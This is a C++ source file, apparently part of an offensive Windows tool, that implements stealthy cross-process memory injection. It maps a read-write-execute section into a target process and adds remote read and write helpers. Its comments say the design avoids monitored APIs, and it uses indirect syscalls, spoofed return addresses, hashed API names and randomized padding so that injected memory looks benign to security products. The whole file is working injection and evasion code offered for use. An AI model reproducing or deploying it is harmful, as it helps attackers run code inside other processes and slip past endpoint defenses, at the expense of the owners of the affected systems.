// ============================================================================
// Memory Writer — Section-Backed Cross-Process Memory Injection
// ============================================================================
// Uses NtCreateSection + NtMapViewOfSection for cross-process memory.
// No VirtualAllocEx, no WriteProcessMemory — both heavily monitored.
//
// The section approach produces MEM_MAPPED memory in the target, which
// looks like a mapped file or shared section (normal for DLLs/IPC).
// VirtualAllocEx produces MEM_PRIVATE which is more suspicious.
//
// All NT calls go through indirect syscalls.
// ============================================================================

#include "memory_writer.h"
#include "tartarus.h"
#include "syscall_manager.h"
#include "call_context.h"
#include "hashing.h"
#include "config.h"
#include "prng.h"
#include "crypto.h"

namespace MemoryWriter {

    // ========================================================================
    // Spoofed syscall helpers
    // ========================================================================

    static inline void SpoofBegin() {
        CallContext::g_spoof_ret   = CallContext::GetLegitimateReturnAddress();
        CallContext::g_proxy_frame = nullptr;
    }

    static inline void SpoofEnd() {
        CallContext::g_spoof_ret   = nullptr;
        CallContext::g_proxy_frame = nullptr;
    }

    // ========================================================================
    // CreateSharedMapping
    // ========================================================================

    SharedMapping CreateSharedMapping(HANDLE targetProcess, SIZE_T size,
                                      ULONG localProtect, ULONG remoteProtect) {
        SharedMapping m = {};

        const Tartarus::SyscallEntry* pCreate = Tartarus::GetSyscall(HASH_API("NtCreateSection"));
        const Tartarus::SyscallEntry* pMap    = Tartarus::GetSyscall(HASH_API("NtMapViewOfSection"));
        const Tartarus::SyscallEntry* pUnmap  = Tartarus::GetSyscall(HASH_API("NtUnmapViewOfSection"));
        const Tartarus::SyscallEntry* pClose  = Tartarus::GetSyscall(HASH_API("NtClose"));

        if (!pCreate || !pMap || !pUnmap || !pClose) {
            LOG_ERROR("MemWriter: Missing section syscalls");
            return m;
        }

        // Page-align and add random padding to vary allocation size
        SIZE_T alignedSize = (size + 0xFFF) & ~(SIZE_T)0xFFF;
        SIZE_T paddedSize = alignedSize + ((Prng::Next32() % 4) + 1) * 0x1000;

        LARGE_INTEGER sectionSize;
        sectionSize.QuadPart = (LONGLONG)paddedSize;

        // Determine section protection — must be superset of both view protections
        ULONG sectionProtect = PAGE_EXECUTE_READWRITE;

        // Create anonymous section
        SpoofBegin();
        NTSTATUS status = DoSyscallSpoofed(
            pCreate->Ssn, SyscallManager::GetRandomTrampoline(),
            (ULONG_PTR)&m.hSection, (ULONG_PTR)SECTION_ALL_ACCESS,
            (ULONG_PTR)nullptr, (ULONG_PTR)&sectionSize,
            (ULONG_PTR)sectionProtect, (ULONG_PTR)SEC_COMMIT,
            (ULONG_PTR)nullptr);
        SpoofEnd();

        if (!NT_SUCCESS(status) || !m.hSection) {
            LOG_ERROR("MemWriter: NtCreateSection failed: 0x%08X", status);
            return m;
        }

        // Map local view (RW for writing)
        SIZE_T viewSize = 0;
        SpoofBegin();
        status = DoSyscallSpoofed(
            pMap->Ssn, SyscallManager::GetRandomTrampoline(),
            (ULONG_PTR)m.hSection, (ULONG_PTR)(HANDLE)-1,
            (ULONG_PTR)&m.localView, (ULONG_PTR)0, (ULONG_PTR)0,
            (ULONG_PTR)nullptr, (ULONG_PTR)&viewSize,
            (ULONG_PTR)2, (ULONG_PTR)0, (ULONG_PTR)localProtect);
        SpoofEnd();

        if (!NT_SUCCESS(status) || !m.localView) {
            LOG_ERROR("MemWriter: Local map failed: 0x%08X", status);
            SpoofBegin();
            DoSyscallSpoofed(pClose->Ssn, SyscallManager::GetRandomTrampoline(), (ULONG_PTR)m.hSection);
            SpoofEnd();
            m.hSection = nullptr;
            return m;
        }

        // Map remote view in target process
        viewSize = 0;
        SpoofBegin();
        status = DoSyscallSpoofed(
            pMap->Ssn, SyscallManager::GetRandomTrampoline(),
            (ULONG_PTR)m.hSection, (ULONG_PTR)targetProcess,
            (ULONG_PTR)&m.remoteView, (ULONG_PTR)0, (ULONG_PTR)0,
            (ULONG_PTR)nullptr, (ULONG_PTR)&viewSize,
            (ULONG_PTR)2, (ULONG_PTR)0, (ULONG_PTR)remoteProtect);
        SpoofEnd();

        if (!NT_SUCCESS(status) || !m.remoteView) {
            LOG_ERROR("MemWriter: Remote map failed: 0x%08X", status);
            // Unmap local view
            SpoofBegin();
            DoSyscallSpoofed(pUnmap->Ssn, SyscallManager::GetRandomTrampoline(),
                (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)m.localView);
            DoSyscallSpoofed(pClose->Ssn, SyscallManager::GetRandomTrampoline(), (ULONG_PTR)m.hSection);
            SpoofEnd();
            m.localView = nullptr;
            m.hSection = nullptr;
            return m;
        }

        m.viewSize = viewSize;
        m.success = true;

        LOG_SUCCESS("MemWriter: Shared section @ local=%p remote=%p (%zu bytes)",
            m.localView, m.remoteView, m.viewSize);

        return m;
    }

    // ========================================================================
    // WriteThrough
    // ========================================================================

    bool WriteThrough(SharedMapping& mapping, const void* data, SIZE_T size, SIZE_T offset) {
        if (!mapping.success || !mapping.localView) return false;
        if (offset + size > mapping.viewSize) return false;

        // Volatile copy to prevent compiler elision
        volatile BYTE* dst = (volatile BYTE*)mapping.localView + offset;
        const BYTE* src = (const BYTE*)data;
        for (SIZE_T i = 0; i < size; i++) {
            dst[i] = src[i];
        }

        return true;
    }

    // ========================================================================
    // DetachLocal — unmap our view, keep remote alive
    // ========================================================================

    void DetachLocal(SharedMapping& mapping) {
        if (!mapping.localView) return;

        const Tartarus::SyscallEntry* pUnmap = Tartarus::GetSyscall(HASH_API("NtUnmapViewOfSection"));
        if (pUnmap) {
            SpoofBegin();
            DoSyscallSpoofed(pUnmap->Ssn, SyscallManager::GetRandomTrampoline(),
                (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)mapping.localView);
            SpoofEnd();
        }
        mapping.localView = nullptr;

        // Close section handle — the remote mapping persists because the
        // target process holds a reference through its mapped view
        if (mapping.hSection) {
            const Tartarus::SyscallEntry* pClose = Tartarus::GetSyscall(HASH_API("NtClose"));
            if (pClose) {
                SpoofBegin();
                DoSyscallSpoofed(pClose->Ssn, SyscallManager::GetRandomTrampoline(),
                    (ULONG_PTR)mapping.hSection);
                SpoofEnd();
            }
            mapping.hSection = nullptr;
        }

        LOG("MemWriter: Local view detached (remote persists)");
    }

    // ========================================================================
    // Destroy — full cleanup
    // ========================================================================

    void Destroy(SharedMapping& mapping, HANDLE targetProcess) {
        const Tartarus::SyscallEntry* pUnmap = Tartarus::GetSyscall(HASH_API("NtUnmapViewOfSection"));
        const Tartarus::SyscallEntry* pClose = Tartarus::GetSyscall(HASH_API("NtClose"));

        if (mapping.localView && pUnmap) {
            SpoofBegin();
            DoSyscallSpoofed(pUnmap->Ssn, SyscallManager::GetRandomTrampoline(),
                (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)mapping.localView);
            SpoofEnd();
            mapping.localView = nullptr;
        }

        if (mapping.remoteView && pUnmap) {
            SpoofBegin();
            DoSyscallSpoofed(pUnmap->Ssn, SyscallManager::GetRandomTrampoline(),
                (ULONG_PTR)targetProcess, (ULONG_PTR)mapping.remoteView);
            SpoofEnd();
            mapping.remoteView = nullptr;
        }

        if (mapping.hSection && pClose) {
            SpoofBegin();
            DoSyscallSpoofed(pClose->Ssn, SyscallManager::GetRandomTrampoline(),
                (ULONG_PTR)mapping.hSection);
            SpoofEnd();
            mapping.hSection = nullptr;
        }
    }

    // ========================================================================
    // RemoteWrite — direct NtWriteVirtualMemory (for small patches)
    // ========================================================================

    bool RemoteWrite(HANDLE targetProcess, PVOID remoteAddr, const void* data, SIZE_T size) {
        const Tartarus::SyscallEntry* pWrite = Tartarus::GetSyscall(HASH_API("NtWriteVirtualMemory"));
        if (!pWrite) return false;

        SIZE_T bytesWritten = 0;
        SpoofBegin();
        NTSTATUS status = DoSyscallSpoofed(
            pWrite->Ssn, SyscallManager::GetRandomTrampoline(),
            (ULONG_PTR)targetProcess,
            (ULONG_PTR)remoteAddr,
            (ULONG_PTR)data,
            (ULONG_PTR)size,
            (ULONG_PTR)&bytesWritten);
        SpoofEnd();

        return NT_SUCCESS(status) && bytesWritten == size;
    }

    // ========================================================================
    // RemoteRead — direct NtReadVirtualMemory
    // ========================================================================

    bool RemoteRead(HANDLE targetProcess, PVOID remoteAddr, void* buffer, SIZE_T size) {
        const Tartarus::SyscallEntry* pRead = Tartarus::GetSyscall(HASH_API("NtReadVirtualMemory"));
        if (!pRead) return false;

        SIZE_T bytesRead = 0;
        SpoofBegin();
        NTSTATUS status = DoSyscallSpoofed(
            pRead->Ssn, SyscallManager::GetRandomTrampoline(),
            (ULONG_PTR)targetProcess,
            (ULONG_PTR)remoteAddr,
            (ULONG_PTR)buffer,
            (ULONG_PTR)size,
            (ULONG_PTR)&bytesRead);
        SpoofEnd();

        return NT_SUCCESS(status) && bytesRead == size;
    }

} // namespace MemoryWriter